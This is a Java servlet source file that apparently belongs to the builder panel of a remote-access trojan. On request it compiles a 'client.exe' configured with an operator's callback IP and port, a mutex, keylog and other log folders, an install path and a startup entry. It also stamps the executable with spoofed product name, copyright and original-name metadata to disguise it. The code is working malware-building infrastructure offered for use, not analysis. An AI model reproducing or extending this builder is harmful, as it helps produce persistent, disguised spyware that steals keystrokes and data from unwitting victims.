package Utilities.Servlets;

import Compiler.ClientExtractor;
import Compiler.CompilerProcess;
import Compiler.FileModifier;
import Packets.Compilation.AssemblySettings;
import Packets.Compilation.CompileSettings;
import Server.Client;
import Utils.Time;
import org.apache.commons.lang3.SystemUtils;
import org.json.JSONObject;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.util.concurrent.atomic.AtomicBoolean;

public class CompilationServlet extends HttpServlet {
    private final AtomicBoolean isCompilationInProgress = new AtomicBoolean(false);

    private final String CLIENTS_FOLDER_NAME = "clients";

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        if (!isCompilationInProgress.compareAndSet(false, true)) {
            resp.setContentType("application/json");
            resp.setStatus(HttpServletResponse.SC_CONFLICT); // HTTP 409
            sendJsonResponse(resp, 2, null,"Compilation already in progress.");
            return;
        }
        try {
            StringBuilder sb = new StringBuilder();
            try (BufferedReader reader = req.getReader()) {
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line).append('\n');
                }
            }
            String jsonText = sb.toString();
            System.out.println(jsonText);
            JSONObject jsonObject = new JSONObject(jsonText);
            System.out.println("Received to compile: " + jsonObject);

            // TODO fix folder location of modules
            CompileSettings compileSettings = new CompileSettings(
                    jsonObject.getString("ip"),
                    jsonObject.getInt("port"),
                    jsonObject.getString("tag"),
                    jsonObject.getString("mutex"),
                    jsonObject.getInt("timing"),
                    "WLogs",
                    "KLogs",
                    jsonObject.getInt("installationPath"),
                    jsonObject.getString("folderName"),
                    jsonObject.getString("executableName"),
                    jsonObject.getString("startupName")
            );

            AssemblySettings assemblySettings = new AssemblySettings(
                    jsonObject.getString("fileDescription"),
                    jsonObject.getString("versionOfFileAndProduct"),
                    jsonObject.getString("productName"),
                    jsonObject.getString("copyright"),
                    jsonObject.getString("originalName"),

                    "" // TODO ICON IMPLEMENTATION
            );
            ClientExtractor clientExtractor = new ClientExtractor();
            clientExtractor.call();

            FileModifier uniqueCompiler = new FileModifier(ClientExtractor.localClientFiles);
            uniqueCompiler.generateConfigurationFile(compileSettings);
            uniqueCompiler.generateAssemblyConfigurationFile(assemblySettings);
            int numCores = Runtime.getRuntime().availableProcessors();
            String makeCommand;
            if (SystemUtils.IS_OS_WINDOWS) {
                makeCommand = "mingw32-make";
            } else {
                makeCommand = "make";
            }
            File folderOfDownloads = new File(Path.of(Client.FOLDER_OF_DOWNLOADS, CLIENTS_FOLDER_NAME ,new Time().getTime()).toString());
            if (!folderOfDownloads.exists()){
                folderOfDownloads.mkdirs();
            }
            String currentDirectory = System.getProperty("user.dir");
            String clientPath = Path.of( folderOfDownloads.toString(), "client.exe").toString();
            String compilerPath = Path.of(currentDirectory, clientPath).toString();
            makeCommand += " TARGET=\""+compilerPath+"\"";
            makeCommand += " -j" + numCores;
            System.out.println(makeCommand);
            CompilerProcess compilerProcess = new CompilerProcess(makeCommand, ClientExtractor.localClientFiles);
            int result = compilerProcess.call();
            if (result == 0) {
                resp.setStatus(HttpServletResponse.SC_OK); // HTTP 200
                sendJsonResponse(resp, result, clientPath,"Compilation completed successfully.");
            } else {
                resp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR); // HTTP 500
                sendJsonResponse(resp, result, null,"Compilation failed with code: " + result);
            }
        } catch (Exception e) {
            resp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR); // HTTP 500
            sendJsonResponse(resp, 1, null,"An error occurred during compilation: " + e.getMessage());
        } finally {
            isCompilationInProgress.set(false);
        }
    }

    private void sendJsonResponse(HttpServletResponse resp, int status, String path, String message) throws IOException {
        resp.setContentType("application/json");
        JSONObject jsonResponse = new JSONObject();
        jsonResponse.put("status", status);
        jsonResponse.put("message", message);
        jsonResponse.put("path", path);
        resp.getWriter().println(jsonResponse);
    }

}

